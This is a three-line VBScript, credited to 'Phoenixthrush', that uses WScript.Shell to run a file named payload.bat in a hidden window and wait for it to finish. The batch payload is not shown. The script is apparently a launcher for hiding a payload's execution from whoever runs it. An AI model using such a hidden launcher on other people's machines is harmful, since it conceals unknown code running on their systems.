set WshShell = wscript.createobject("WScript.shell")
WshShell.run """.\payload.bat"" ", 0, true

' Copyright Phoenixthrush